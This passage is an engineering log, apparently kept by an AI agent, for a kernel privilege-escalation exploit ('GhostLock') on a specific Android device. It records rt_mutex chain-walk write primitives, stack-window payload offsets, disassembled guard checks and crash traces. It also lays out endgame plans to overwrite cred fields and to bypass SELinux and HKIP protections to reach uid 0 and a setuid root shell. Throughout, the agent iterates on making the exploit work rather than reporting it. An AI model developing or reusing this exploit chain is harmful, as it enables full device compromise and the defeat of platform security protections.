                           succeeds, it retries, and the consumer times out: no store, no
                           panic (the measured 30/30 "no write").
2. **The code contradicts itself on the trigger polarity.**  The comment at lines
   1096-1112 says: "ALWAYS trigger with an IMPROVING nice (19 -> 18) ... a worsening
   change can make __sched_setscheduler() reschedule the target ... straight over the
   stamped window".  Line 1121 nevertheless fires `SCHED_BATCH, 20` (a worsening nice).
3. `waiter->task` is hard-wired to `&init_task` (lines 353/1654) although `g_ytask` exists
   and `leak_current_task()` (1031) can fill it.  `init_task` has no PI waiters, so the
   requeue branch that reaches `rb_erase_cached` is not reliably taken.
4. `g_trig_req` was not cleared at the start of an epoch (a stale flag can make the
   consumer fire against the previous window).
5. Dead code/plumbing: `g_walk_started`/`g_stamp_paused` are written (1113-1114) and never
   read; `--hkip` is documented but never parsed; `do_walk_once()` is never called;
   `g_use_ss`/`g_use_sel`/`g_scratch`/`g_fake_lock_a..c` unused.

FIX IMPLEMENTED (this commit): `--trigfirst`.
   * In `stamp_gset()`, after the single copy, do NOT enter any syscall: set the trigger
     request and spin in user space until the consumer's `g_trig_ack` arrives, so the walk
     reads the copy byte-for-byte.
   * In `thread_consumer()`, when `--trigfirst` is set, skip the 3 ms `usleep` and fire the
     walk at once using the IMPROVING polarity (nice 18) that the code's own comment says
     is the clean one.
   * `do_write()` now clears `g_trig_req` at the start of each epoch.

DECISIVE TEST (running): `--storetest --trigfirst` then `--mcastcal --trigfirst`.
Expectations: if the freeze really was the destroyer, the canary run must fault with
`x24 = 0xdead0016` (the structured window is read) and `--storetest` must report
`[WRITE OK]`.  If the canary still faults at 0 or not at all, the destroyer is something
else (tick/IPI/schedule frame on the userspace spin) and the next lever is a re-copy
immediately before the trigger.


## 9ab. KEY DISCRIMINATOR: one copy reads back as ZERO, a re-copy loop reads CONTENT

`--storetest --trigfirst` (a single MCAST copy, then NO syscall at all before the walk)
still panicked with `NULL pointer dereference at 00000000`, `PC=chain+0x140`, `x24=0`,
`x25=W`.  So the freeze syscall was NOT what destroyed the window - the window is already
zero when the walk reads it, even when the stamper never leaves user space.

Combined with the earlier rows this isolates the real behaviour:

| copies before the walk | window content at walk time |
|---|---|
| exactly one (`--trigfirst`, `--sigfreeze`, default ppoll) | `*(W+0x38) == 0` -> NULL deref |
| a tight re-copy loop (`--nofreeze`) | non-zero but torn -> guard BUG at +0xaf0 |

So the copy is NOT landing on the first call, but IS landing on later calls.  Two candidate
mechanisms, both testable:
 (a) the FIRST `setsockopt(MCAST_BLOCK_SOURCE)` on a fresh socket takes a deeper/other
     path (membership setup), so its `do_ip_setsockopt` frame differs and the copy lands
     outside the window; subsequent calls with the membership already present take the
     shallow early-bail path and land correctly;
 (b) a single kernel entry between the copy and the walk (e.g. the `sigprocmask(SIG_UNBLOCK,
     SIGUSR1)` that used to run right after the copy, whose return can run do_signal and
     whose frames march E-0x40 -> E-0x300 through the window) wipes the region; the re-copy
     loop simply re-writes it faster than the wiper runs.

Fix attempt in flight: `--trigfirst` now skips that sigprocmask entirely and the consumer
polls without usleep, so the only syscall after the copy is the copy's own return.  Canary
oracle: `--mcastcal --trigfirst` must fault with `x24 = 0xdead0016`.
If it still faults at 0, mechanism (a) holds and the next change is a warm-up copy
(1-2 dummy setsockopt calls) before the window copy.


## 9ac. SOLVED: the sigprocmask after the copy was the window destroyer - --trigfirst fixes it

Canary oracle finally positive:

    --mcastcal --trigfirst
    Unable to handle kernel paging request at virtual address dead0016
    PC is at rt_mutex_adjust_prio_chain+0x140/0xbac
    x25: ffffffdaf5c63cf0          (W, the leaked waiter)
    x24: 00000000dead0016          (waiter->lock == our canary slot 0x16)

So with `--trigfirst` the walk reads the stamped window BYTE-FOR-BYTE: the canary slot that
should land on waiter->lock (buffer offset 0xB0 = `w[7]`) does land exactly there, i.e. the
MCAST landing offset is exactly 0x78 and there is no 0x10 drift in this configuration.

The destroyer was NOT the freeze but the **`sigprocmask(SIG_UNBLOCK, SIGUSR1)` that the code
ran immediately AFTER the copy** (old line 543).  That is a kernel entry: if a SIGUSR1 is
pending its return path runs do_signal(), and do_signal's frames march from E-0x40 down past
E-0x300 - straight through the window (exactly the hazard STAMP_ROOTCAUSE_20260922.md §2
documents).  One copy + one do_signal = the window reads back as 0 (`x24=0`, NULL deref).
The `--nofreeze` re-copy loop out-ran the wiper, which is why it read non-zero (torn) content
and hit the guard BUG instead.  ppoll and rt_sigsuspend were then red herrings - they were
used together with the same sigprocmask.

Fix (implemented, `--trigfirst`):
  * skip the SIGUSR1 unblock entirely in this mode (no need to be woken: we never block),
  * after the single copy set g_trig_req/g_stamp_ack and spin in USER SPACE until the
    consumer's g_trig_ack - no syscall at all between the copy and the walk,
  * consumer: no usleep(200) poll, no usleep(3000) gap; fire at once,
  * do_write() clears g_trig_req per epoch.

Consequence: the write primitive should be back.  Validation in flight:
`--storetest --trigfirst` (expect `[+] WRITE OK`) then, in a separate boot, the endgame
`--credraw --trigfirst` (expect uid 0 / rooted.txt / rsh).


## 9ad. With the window now readable, the remaining failure is a mid-walk clobber - need FROZEN + intact

`--storetest --trigfirst` and `--credraw --trigfirst` panicked at

    kernel BUG at .../rtmutex_common.h:59!   (rt_mutex_top_waiter's BUG_ON(w->lock != lock))
    PC is at rt_mutex_adjust_prio_chain+0xb60

while the fsynced payload echo for the same run was fully correct (`w3=w7=W-0x30`,
`lk4=W-0x20`, `lock=W-0x30`).  So the walk DID read our window, but the two dependent reads
(`waiter->lock` at W+0x38 and `(*rb_leftmost)->lock` at W+0x18) did not agree -> the window was
clobbered DURING the walk.  Reason: `--trigfirst` deliberately does not freeze the stamper, so
it sits in user space for the gap and a tick/IRQ can still land on its kernel stack.

Conclusion: we need BOTH properties at once -
  * the stamper OFF-CPU while the walk runs (so no tick/IRQ frame lands on its stack), and
  * no `do_signal`-generating kernel entry between the copy and the walk.
`--sigfreeze` (rt_sigsuspend, mask = all except SIGUSR1) provides the first; the sigprocmask
that used to run right after the copy provided the second's violation.  That sigprocmask is
in fact REDUNDANT for rt_sigsuspend: the freeze installs its own mask, so SIGUSR1 is already
deliverable without touching the thread mask.  It is now removed unconditionally.

Expected after this change: `--storetest --sigfreeze` -> `[+] WRITE OK`, and then the endgame
`--credraw --sigfreeze` -> uid 0.


## 9ae. TWO destroyers: also the freeze syscall itself. --trigfirst is the only option.

With the sigprocmask removed, `--storetest --sigfreeze` (frozen, improving nice 18) still
panicked:

    Unable to handle kernel NULL pointer dereference at virtual address 00000000
    PC is at rt_mutex_adjust_prio_chain+0x140
    x25 = W, x24 = 0
    call trace: rt_mutex_adjust_prio_chain <- rt_mutex_adjust_pi <- __sched_setscheduler
    payload echo: w3=w7=lock=W-0x30, lk4=W-0x20   (i.e. the payload is correct)

So the window was ZERO at waiter->lock.  Since the sigprocmask is gone, the only remaining
kernel entry between the copy and the walk was the freeze syscall itself
(`rt_sigsuspend`) - confirming the original audit verdict: the freeze's own entry/blocked
frames reach [E-0x248,E-0x140] and replace the payload.

Therefore BOTH of these destroy the window and must be absent:
  1. the post-copy `sigprocmask` (its return can run do_signal)  -> fixed by --trigfirst
  2. ANY blocking syscall entered after the copy (ppoll, rt_sigsuspend) -> only --trigfirst
     avoids it (it spins in user space instead)

Also confirmed from the call trace: the trigger really is the sched_setattr path
(`__sched_setscheduler -> rt_mutex_adjust_pi -> rt_mutex_adjust_prio_chain`), and the
improving nice (18) is what makes the walk read the window at all (the worsening 20 made it
bail silently).

Current best configuration: `--trigfirst` (window read byte-for-byte; canary faults exactly
at 0xdead0016).  Remaining defect with the real payload: `kernel BUG at rtmutex_common.h:59`
at `rt_mutex_adjust_prio_chain+0xb60` (the rt_mutex_top_waiter check, i.e. the walk's own
`pi_tree_entry` manipulation of our fake waiter makes `w[3]` disagree with `lock` before the
guard re-reads it).  Open question for the fresh audit: which trigger makes the chain take
the FULL requeue walk that actually performs `rb_erase_cached` (the futex-requeue path, as
in upstream GhostLock) instead of the MIN walk of sched_setattr.

## 10. Run log (latest first)

* **`--captest` (leak once + walk retries)**: attempt 0/1 benign, attempt 2
  passed the guard, executed the erase (store into `cred+0x38`) and died on the
  clobbered `rb_root` read at `+0x2d8` (`0xc0 -> *(0x100)`).
* **`--captest` (old shape, 6-cycle grind)**: 6/6 panicked on attempt 0; the old
  shape re-ran the ~20 s cred leak every attempt and got only one walk, i.e. it
  never used `--storetest`'s retry pattern.
* **`--storetest` re-verification** (after restoring the known-good carrier):
  attempts 0/1 cold, attempt 2 `[!] WRITE OBSERVED` + `[WRITE OK]`, `exit=0`.
* Historic: `--mcastcal` faults at `dead0016` (geometry exact); `--gsettest`
  errno 99 (the copy runs); `--lockck` proved the structured window is read.




























## 9af. The +0xaf0 guard BUG was SELF-INFLICTED: rb_leftmost aliased the stamped waiter's pi_tree

Measured with the single-left-child payload:

    kernel BUG at .../rtmutex_common.h:59!
    PC is at rt_mutex_adjust_prio_chain+0xaf0/0xbac
    x25 = W,  x24 = W-0x30   <-- the walk read OUR fake lock correctly!
    payload echo: w3=w7=lock=W-0x30, lk4=W-0x20

So the payload reached the guard, yet `BUG_ON(w->lock != lock)` fired.  Why: the guard is

    top_waiter = rb_entry(rb_leftmost, struct rt_mutex_waiter, tree_entry);
    BUG_ON(top_waiter->lock != lock);

and `rb_leftmost` was `W-0x20`, so `top_waiter->lock` read `*(W-0x20+0x38) = *(W+0x18) = w[3]`.
But `w[3]` is the STAMPED waiter's `pi_tree.rb_parent_color`, and
`rt_mutex_adjust_prio_chain` itself rewrites `pi_tree` through
`rt_mutex_dequeue_pi()`/`rt_mutex_enqueue_pi()` - the walk overwrote the very word the guard
then re-read.  Self-inflicted tear, exactly the class of failure the external PoCs avoid by
keeping the fake rb_leftmost node in a *separate* location.

FIX (implemented): the fake rb_leftmost node now sits at the WINDOW BASE
(`W - g_w_off` = buffer 0), so its `rt_mutex_waiter.lock` (+0x38) and `prio` (+0x40) read
buffer **0x38** and **0x40** - both outside the stamped waiter (buffer 0x78..0xA7) and never
written by the walk.  `lk[4] = W - g_w_off`; `buf[0x38] = lock`; `buf[0x40] = 130`
(< `w[8] = 0x7fffffff`).  `rb_erase_cached()` only calls `rb_next()` when
`root->rb_leftmost == node`, so any leftmost != node keeps us off that path.

Layout note (confirmed correct for this kernel): CONFIG_DEBUG_SPINLOCK makes
`raw_spinlock_t` 0x18 bytes, so inside `struct rt_mutex`: `wait_lock`@0x00,
`waiters.rb_root`@0x18, `waiters.rb_leftmost`@0x20, `owner`@0x28 - which is what `lk[3]`,
`lk[4]`, `lk[5]` already encode.

Also in this change: `w[1]=0` / `w[2]=target` (upstream single-left-child shape) and
`w[4]=0` (keep the stamped waiter's pi_tree out of the way).


## 9ag. EXACT guard semantics + the shallow half of the MCAST window does not survive

Disassembled on our own vmlinux (`F:\Dev\firmware\MRX-W09\extracted\vmlinux.elf`,
rt_mutex_adjust_prio_chain = 0xffffff800822ea28).  The branch to the BUG at +0xaf0 comes from
**+0x294**, and the guard is literally:

```
+0x288: ldr x8, [x24,#32]     ; x8 = *(lock + 0x20)     <- rb_leftmost (DEBUG_SPINLOCK:
                              ;   wait_lock 0x18, rb_root 0x18, rb_leftmost 0x20)
+0x298: ldr x8, [x8,#56]      ; x8 = *(rb_leftmost + 0x38)  <- top_waiter->lock
+0x29c: cmp x8, x24
+0x2bc: b.ne +0xaf0 -> brk #0x800      (BUG_ON(w->lock != lock))
```

So the guard needs `*(rb_leftmost + 0x38) == lock` and nothing else.

MEASURED with `lk[4] = W-0x78` (fake node at buffer 0, buffer 0x38 set to `lock`):

```
oops: PC = rt_mutex_adjust_prio_chain+0xaf0
      x24 = W-0x30            <- our fake lock, read correctly
      x25 = W
      x8  = 0x0000000000000000  <- *(rb_leftmost+0x38) is ZERO
klog echo: lk4 = W-0x78, lock = W-0x30, w3 = w7 = W-0x30
```

i.e. `g_sbuf+0x38` held `lock`, but the KERNEL window at `W-0x40` was zero.  **The shallow half
of the MCAST copy is not preserved** - `do_ip_setsockopt`'s own frame writes over the first
slots of the region it copied into (the copy target is `sp+0x38` inside that very frame).
Conversely the deeper slots DO survive: the oops `x24` read `w[7]` (buffer 0xB0) correctly, and
the earlier canary faulted exactly at `0xdead0016` = buffer 0xB0.

FIX (implemented): point `rb_leftmost` at the STAMPED waiter itself, `lk[4] = W`, so the guard
reads `*(W+0x38) = w[7] = lock` - a slot that is proven to survive.  `rb_erase_cached()` then
sees `rb_leftmost == node` and calls `rb_next(node)`; with `tree.rb_right = 0` that walks
`rb_parent(node) = value & ~3` (a readable stack address, since value = g_blackval), so it
cannot fault, and the erase + `*(target) = value` proceed.

IMPORTANT CONSEQUENCE for payload design on this carrier: never place a fake object whose
instrumental field lands in the copy's first ~0x40 bytes (buffer 0x00..0x3F <-> E-0x248..E-0x210);
only the deeper part of the 0x108-byte MCAST window is stable.


## 9ah. The fake rt_mutex must live in the window TAIL (g_lk_off = 0xC8)

With `rb_leftmost = W` the guard still BUGged at +0xaf0 (x24 = our lock again), so the
`rb_leftmost` VALUE itself (buffer 0x68, i.e. `lock+0x20` of a fake rt_mutex at buffer 0x48)
is also clobbered: `rb_first_cached` then falls back to `rb_first(root)` on a garbage
`rb_root`, returns a garbage top_waiter, and the guard fails.

Clobber map derived from the measurements:
  * buffer 0x38 (W-0x40) -> 0                -> CLOBBERED
  * buffer 0x68 (W-0x10) -> not our value    -> CLOBBERED
  * buffer 0xB0 (W+0x38, w[7])               -> SURVIVES (oops x24; canary 0xdead0016)
i.e. the shallow/middle of the copy is destroyed by do_ip_setsockopt's own frame while the
deep part survives.

Therefore the fake `rt_mutex` moved into the only free contiguous TAIL of the 0x108-byte
window: `g_lk_off = 0xC8` (buffer 0xC8..0xF7; the stamped waiter occupies 0x78..0xC7).
Then `lock = W+0x50`, `rb_root` @buffer 0xE0, `rb_leftmost` @0xE8, `owner` @0xF0 - all in the
deep, surviving half - and `lk[4] = W` so the guard reads `*(W+0x38) = w[7] = lock`, the one
slot that is proven to survive.


## 9ai. DECISION: stop the incremental drift, rebase on the best commit (32ed48c)

The last working state is commit **32ed48c** ("WINDOOR CLOBBER SOLVED - reliable write,
3/3 [WRITE OK] on attempt 0"), preceded by cea9f86 ("freeze the window by sharing the
stamper's CPU").  Its configuration is SIMPLE:

  * carrier  : MCAST setsockopt, copy once
  * freeze   : `ppoll` (arm64 pause, syscall 73) -> stamper ASLEEP
  * trigger  : consumer waits 3 ms then `sched_setattr(y_tid, SCHED_BATCH, 20)` (WORSENING)
  * CPU      : stamper pin_cpu(7) and consumer pin_cpu(7) (same CPU)
  * payload  : g_lk_off = 0x48 -> lock = W-0x30, lk[4] = rb_leftmost = W-0x20, w[3] = w[7] = lock
  * (the post-copy `sigprocmask(SIG_UNBLOCK,SIGUSR1)` was PRESENT)

Everything after that (--trigfirst, --sigfreeze, removing the sigprocmask, the
single-left-child payload, w[4], rb_leftmost = the window base, rb_leftmost = W,
g_lk_off = 0xC8) was MY incremental inference, and each step moved the fault somewhere else
rather than converging:

  +0x140 NULL deref (x24=0)  ->  +0xaf0 BUG (x24 = our lock, x8 = 0)  ->  +0xb60 BUG
  ->  read-fault at a foreign address + +0xb60 BUG

That is exactly the "complexity trap": layering fixes on top of an assumption without ever
re-validating the baseline.

PLAN (adopted):
  1. Re-verify the untouched `32ed48c` binary on the device (`ghostlock_best`, running
     `--storetest`) - if it still prints `[+] WRITE OK`, the best-known-good is intact and
     the device is fine; the drift is purely mine.
  2. Then rebase the current source onto 32ed48c for the stamp/trigger/payload, and re-apply
     only the ENDGAME additions from the newer commits (--credraw / --sleepmain / --capeff ...),
     which are orthogonal to the write layer.
  3. From then on: one change -> one verification -> one commit, and discard any change not
     proven by a measurement.


## 9aj. BREAKTHROUGH: the write primitive was never broken - the ENDGAME's leak eats the walk

Ran the UNTOUCHED best-commit binary (32ed48c, built as ghostlock_best) on the device twice,
same boot conditions, same injection:

    --storetest  ->  [*] [!] WRITE OBSERVED (witness) ack=0 gset=-1
                     [*] paranoid='-173966192' got=-173966192 want=-173966192 [WRITE OK]
                     [+] MCAST + Case-B write primitive VERIFIED end-to-end
                     [+] ran stamp+trigger ok=1          (no panic)

    --capeff     ->  [c] leak_cred: capset rc=-1 errno=1        <- the leak runs FIRST
                     [*] writing cap_effective=0xfffffff3f737fc90 (CAP_SETUID, RB_BLACK slot)
                         at 0xfffffff32e6117b8
                     [*] [*] no write seen (uid=2000) ack=1 gset=-1
                     [*] setresuid(0,0,1) -> -1 uid=2000
                     [-] capeff: stopping after 10 attempts        (10/10 no write)

Identical binary, identical device: `--storetest` writes on attempt 0, `--capeff` never
writes.  The difference is that the endgame calls `leak_cred()` FIRST, and that leak fires its
own walk - which CONSUMES `task->pi_blocked_on`, after which every later walk is a silent
no-op.  This is exactly what the source already documents:

    "leak_current_task() fires its own walk, which consumes task->pi_blocked_on and makes
     every later walk a silent no-op (measured: 20/20 'no write seen')"

`--storetest` succeeds precisely because it needs NO leak - its target is the fixed
link-time address `sysctl_perf_event_paranoid`.

CONCLUSION: the write layer has been working the whole time.  The endgame fails because of an
ORDERING problem: one process may perform exactly ONE effective walk, and the leak spends it.

CORRECT ENDGAME SHAPE (next):
  * the address needed by the endgame must be obtained WITHOUT firing a walk (or in a
    DIFFERENT process), and the writing process must do the write as its FIRST walk;
  * options: (a) persist the leak in one process and pass the addresses to a fresh process
    via a file (gl.klog already exists as the durable channel); (b) use a leak-free known
    address (like --storetest does); (c) supply the leaked task/cred addresses on the
    command line for the write process.

## 9ak. 2026-09-23 (late session): corrections to 9aj; 2 walks per process is THE blocker

All measured on the same healthy device (control `--storetest` on the untouched best binary
still prints `[+] MCAST + Case-B write primitive VERIFIED` on attempt 0; the ~29 permanent
D-state vendor threads are NORMAL, not degradation).

1. 9aj's causal claim is WRONG.  A leak does NOT "consume the walk".  Evidence:
   * `--twowrite` (new, in ghostlock_mrx_e.c): write probe A (value=g_blackval) to the
     readable sysctl, then probe B (value=g_blackval2, a different window slot) to the same
     sysctl.  Result: `A readback == want`, `B readback == A's value`, i.e. `[ONLY ONE WALK]`
     -- the one-walk-per-process rule is REAL.
   * `--storetest --leakfirst` (new: calls `leak_cred()` before the stamping threads exist,
     then the identical storetest write): still `[WRITE OK]` on attempt 0.  So a pre-thread
     leak does NOT break the following walk.
   => the real defect is that the ADDRESS the leak returns is not our cred, not that the
      leak spends the walk.

2. ALL zero-walk address leaks are broken on this kernel:
   * `leak_task()` reads register index 23 at samples inside `__schedule`.  `--readcomm`
     (one walk reads `*(task_own+0xAB8)`=comm through boot_id) returns comm='5', i.e. NOT
     our task; and `leak_task_own` (PERF_SAMPLE_TID-filtered to our tid) still yields a
     different `best` every run.  So x23 is NOT `current` here.  (Corrects §2/§5's
     "perf x23 = sp_el0 = current".)
   * `leak_cred2()` (new; forces a real commit_creds via
     `keyctl(KEYCTL_JOIN_SESSION_KEYRING,<unique>)`): `samples=18 commits=0` -- keyctl does
     NOT reach commit_creds (SELinux/perms), so no new cred is sampled.
   * `leak_cred()` does get `commit_creds` samples, but its returned cred is not current:
     `--credverify` (one walk reads `*(cred+4)`=uid through boot_id) gives `uid=601447618`
     vs expected 2000 (gid reads 2000) => the pointer is a stale/other object.
   * `fork`/`exec` do NOT share the cred pointer across separate `adb shell` children:
     three `--readcred` runs returned three different cred addresses ("CRED_DIFFERENT"), so
     two-process hand-off cannot work either.

3. `--capempty` (the address-free one-walk idea) is structurally impossible.  Panic:
   `rb_erase_cached+0x164` (the erase's side-store `*(value&~3 + 8) = target`).  With
   `value = capable_list` that store hits `capable_list+8` (read-only / HHEE-protected).  If
   instead `value` is a safe window slot, `capable_list.first` becomes a window address and
   the hlist walk dereferences a bogus hook.  The two requirements are mutually exclusive.

4. Structural conclusion.  The HKIP bit is set only by HVC from
   `commit_creds()->hkip_update_xid_root()`.  A legal root therefore needs BOTH
   (i) an HKIP-invisible "look root" step (cred->cap_effective = blackval) and
   (ii) a commit_creds step (changed setresuid(0,0,1)).  One 8-byte pointer write cannot do
   both, and one process gets exactly one walk => **the endgame needs >=2 effective walks in
   ONE process** (or a working zero-walk address leak, which does not exist here).
   `task->cred=&init_cred` alone is synchronously fatal even for a SLEEPING task
   (`--sleepmain` -> SIGKILL before setresuid, contradicting the "asleep is viable" idea).

NEXT: make the stamper RE-ARMABLE (re-run the FUTEX_CMP_REQUEUE_PI EDEADLK dance on the same
y thread to create a fresh dangling `pi_blocked_on` after each walk).  Then in ONE process:
walk1 = boot_id read of `*(our_task+0x9E8)` (needs a reliable own-task leak: leak_current_task
x22, or a fixed leak_task), walk2 = `cred->cap_effective = g_blackval`, then
`setresuid(0,0,1)` -> commit_creds -> HKIP bit.  ghostlock_mrx_e.c holds the experiments
(`--readcred`, `--readcomm`, `--capx`, `--capy2`, `--twowrite`, `--leakfirst`, `--sleepmain`);
the frozen baseline stays untouched in ghostlock_mrx_best.c.

## 9al. 2026-09-23 (late): RE-ARMABLE STAMPER WORKS; cap_effective LANDS; SELinux is the last gate

1. **The re-armable stamper works.**  `--rearm2` runs two arms in ONE process:
   a fresh x/y thread pair per arm (each y re-runs `leak_waiter_abs()` and the
   FUTEX_CMP_REQUEUE_PI EDEADLK dance, so the dangling `pi_blocked_on` is re-created),
   then `do_write()` performs exactly one walk.  Result:
       rearm2 walk1=-473498480 (want -473498480)  walk2=-473498472 (want -473498472)
       => [BOTH WALKS LAND]
   So the old "one process = one effective walk" limit is broken: N walks per process.

2. **The full endgame now reaches the cred and writes it.**  `--endgame3` (3 arms:
   leak consumer task via x22 -> read cred via boot_id -> write cap_effective):
       arm_leak: consumer_task=0xffffffeb5bfe8000   (x22 in rt_mutex_adjust_prio_chain)
       endgame3: cred=0xffffffec57bbc0c0            (boot_id read of *(T+TASK_CRED))
       endgame3 capget -> 0 eff=0xffffffebf2e1fc90 CAP_SETUID=1   <-- THE WRITE LANDED
       endgame3 setresuid -> -1 uid=2000            (EPERM)
   So `cred->cap_effective = g_blackval` lands on OUR cred in OUR process (capget proves
   it), and HKIP does not object (HKIP-invisible, as predicted).

3. **The remaining blocker is SELinux, not HKIP.**  With cap_effective holding CAP_SETUID,
   `setresuid(0,0,1)` still returns EPERM: `security_capable` runs the SELinux hook too,
   and u:r:shell:s0 lacks the capability.  Fix attempted in `--endgame4`: a 4th arm writes
   `cred->security = <fake task_security_struct with sid=1 (SECINITSID_KERNEL)>` built in
   the last arm's window (that y thread is kept alive so the blob's kernel stack survives),
   then setresuid.  (Known risk: the blob must be a plausible task_security_struct, and the
   LSM must accept the kernel SID.)

4. x22 leak caveat: the chain runs with IRQs disabled, so the hrtimer only rarely samples
   it -> `--endgame4` retries the arm up to 10 times (`arm_leak_task_multi`).  Also, the
   arm-1 "benign" walk must NOT target `perf_event_paranoid` (a positive value there
   disables perf for the retries); it targets `boot_id.data` instead.

5. **Verified: SELinux is Enforcing** (`getenforce`=Enforcing, `enforce=1`,
   `/proc/self/attr/current`=`u:r:shell:s0`).  So the `setresuid` EPERM is the SELinux
   `capability` check, not HKIP.

6. **The fake `cred->security` (kernel SID) line is a DEAD END.**
   * `--endgame4` (write `cred->security = <stack blob, sid=1>`, then setresuid): panic in
     `selinux_cred_free+0x28/0x38` -- SELinux kfree()s `cred->security` when the cred is
     released, and the blob lives on a kernel stack -> page/VM_BUG.  (Observed on
     swapper/0 later: the bad pointer poisons the cred slab.)
   * `--endgame5` adds a `cred->usage` bump first (write `g_blackval` into `C+0`, which also
     sets uid to the value's high word, e.g. 0xfffffff4, i.e. nonzero => HKIP allows) so
     `put_cred(old)` should never reach zero and `selinux_cred_free` should not run.  The
     usage write LANDS (`[!] WRITE OBSERVED (witness) (uid=4294967284)`), but the security
     write (arm5) then STALLS the process: `gl.stage` shows no `D` marker after arm5's
     payload and the process exits 0 with no `capget`/`setresuid` output and no rooted.txt.
   => do NOT keep pushing the stack-blob security pointer.

7. **Remaining viable path: the fork-storm (SELinux-clean).**  Credit a FORKING task with
   `&init_cred` so `copy_creds()` gives the CHILD `init_cred` (kernel SID, so SELinux
   allows) and `copy_process()->hkip_init_task()` sets the child's HKIP bit -- the child is
   born legal root and observes no hook in between.  The re-armable stamper now makes the
   timing (landing the walk inside `copy_process`) far more controllable than the old
   `--fs`.  This is the next implementation target.

## 9am. 2026-09-23 (final of this session): fork-storm attempt; DEVICE now degraded

`--forkstorm [delay_us] [nvma]` is implemented: the CONSUMER (task leaked reliably via x22,
`arm_leak_task_multi`) is credited with `&init_cred` while it is inside `fork()`, and MAIN
fires the walk (it cannot be the consumer, which is busy forking).

Measured (all with a fresh injection, `paranoid=-1`):
* `--forkstorm 300 2000`  -> kernel panic, `rt_mutex_adjust_prio_chain+0x140` (WINDOW CLOBBER).
* `--forkstorm 1500 1500` -> kernel panic, same `+0x140`.
* `--armfire 1500` (isolation: arm + MAIN-fired benign write, no fork) -> kernel panic,
  same `+0x140`.

So the freeze/window reliability is now failing even for a benign write in the main-fired
modes, whereas hours earlier `--rearm2` (consumer-fired, do_write) was clean `[BOTH WALKS LAND]`
and `--storetest` was 3/3.  The most likely explanation is DEVICE DEGRADATION after ~15
kernel panics/reboots in this session (each failed run reboots), not a specific logic bug.

DESIGN NOTE for the next session (avoid MAIN-fired walks):
* The baseline's reliability comes from the trigger being pinned to the SAME cpu as the stamper
  (cpu7): the trigger then runs only while the stamper is off-CPU (asleep in ppoll), so the
  window is frozen.  MAIN is pinned cpu0 and fires concurrently -> it can read a torn window
  (+0x140).
* Therefore the fork-storm should use a dedicated TRIGGER thread pinned cpu7 (not main), and
  the FORKER must be a task whose address is known.  Since x22 only reveals the task that FIRES
  the walk, the clean shape is: (a) have the forker fire one benign walk first so its task T is
  leaked via x22; (b) in the storm, the forker forks while the cpu7 trigger thread fires the
  walk that credits T.
* Only after a benign arm+trigger (no fork) is proven clean on the device should the fork
  timing / VMA widening be tuned.

BLOCKER for verification this session: the device reboots on every exploit attempt (~15 panics),
so no mode can be validated.  A device power-cycle / a long settle (or a different device) is
required before further endgame testing.

## 9an. 2026-09-23 (late): multi-arm fix, --sid root cause, and the refcount-safe correction

### (1) Multi-arm failure ROOT CAUSE and fix (commit `ea2768b`) — MAJOR
`--rearmN 6` was 1/6 with `W=0x0` ("bad waiter").  Cause: `leak_waiter_abs()` bound its perf
event to the PROCESS (`perf_event_open(...,0,...)`); once several threads are alive a
process-wide event stops sampling the fresh y-thread's `do_futex`, so `W` = 0 from arm 1 on.
Fix: bind it to the CALLING THREAD (`tid = gettid()`).  Result: **`--rearmN 6` => 5/6 arms
landed**.  The user's point ("a reboot resets state; it is not device degradation") was correct:
this was a deterministic code bug.  The W-cache experiment was reverted (the stack is only
*sometimes* reused, so caching W is unsafe).

### (2) `--forkseq` (mine) is IMPOSSIBLE with this primitive
Writing `&init_cred` into `task->cred` requires `value = &init_cred`, but `init_cred.usage = 4`
is EVEN; the erase's re-insert reads `*(value)&1` and an even word makes it descend forever.
Observed: `--forkseq` HANGS (no panic; device stays up).  Root cause recorded; do not repeat
unless a "Case-2" write shape (raw pointer, colour irrelevant) is implemented first.

### (3) `--sid` root cause CONFIRMED on-device (pstore)
Any run whose `cred->security` points at our window blob eventually panics:
`kernel BUG at mm/slub.c:4121` in `kfree+0xafc` <- `selinux_cred_free+0x28` <-
`put_cred_rcu+0x8c` <- `rcu_process_callbacks`.  i.e. the fake blob is freed (kfree of a
non-slab pointer) when the cred refcount reaches 0 — on process exit, or because `exec` runs
`de_thread()` and kills the helper threads that hold the shared cred.  Two earlier boots also
showed `proc_do_uuid+0x58` (the boot_id ctl_table `data` pointer clobbered) from the
destructive read path in `--sidroot`.
**Correction that makes the fake-blob design viable: never let that cred be freed.**
Implemented in `--sid`'s success path: write the proof IN-PROCESS (no exec), then PIN the old
cred's usage with `do_write(g_blackval, cred+0)` (usage becomes a huge never-zero value) so no
free path can reach `selinux_cred_free`, then `pause()`.  Needs a clean device run to verify.

### (4) Two sub-agent reports saved (per user request)
* `ghostlock_pocs\CRED_LEAK_AND_STORE_TECHNIQUES_20260923.md`
* `ghostlock_pocs\ENDGAME_TECHNIQUES_20260923.md`
Highest-value content:
* **TID-gated all-register "mode vote" leak** (ghostlock-sabrina `perf_leak_own_task`) returns
  `current` AND `cred` with ZERO walks during a `getpid` storm; a `setpriority(-20)` storm
  yields `cred->security` (tsec) — non-destructive, replaces our fragile fixed-register leaks.
* **`selinux_state.enforcing` is build-specific**: OPPO 4.14 places the authoritative byte at
  `selinux_state+0x04` (Honor 5.10 at +0).  Re-verify by disassembling `avc_denied`.  NOTE: our
  pointer write always has byte4 = 0xff, so only a field at offset 0 is zeroable.
* **Rank 2 (primitive-compatible, kfree-safe): `cred->security := *(init_cred+0x78)`** — the real
  init tsec has first word `0x0000000100000001` (OSID=SID=1, ODD) and is a real slab object.
* **Case-2 write shape** (H80GT/pfem10) writes a raw pointer with no colour constraint — would
  unlock `&init_cred` and raw `{osid,sid}={1,1}` writes.
* **UMH via forged `work_struct` -> call_usermodehelper_exec_work** is the most HKIP-clean route
  (kworker is kernel-domain and already has the HKIP bit); blocked only on bootstrapping RW.
* `security_hook_heads` is RO — confirmed impossible; AVC poisoning needs already-cached denies.
* `commit_creds` BUG_ONs unless `task->cred == task->real_cred` (both must be written together;
  setresuid/setresgid are exempt); a fake cred must be COMPLETE (user/user_ns/group_info/security).

### NEXT
1. Clean device run of the current `--sid` (usage-pin + in-process proof) — verify no panic and
   check `/data/local/tmp/rooted.txt` + 4755 `rsh`.
2. If the blob route is still fragile, implement Rank 2 (`cred->security := *(init_cred+0x78)`),
   reading `init_cred+0x78` in a FORKED reader so a fault kills only the reader.

### (5) Document inventory (badspin + all prior sessions) — two more saved reports
* `ghostlock_pocs\DOC_INVENTORY_20260923.md`
* `binder_uaf\session_20260922\DOC_INVENTORY_20260923.md`
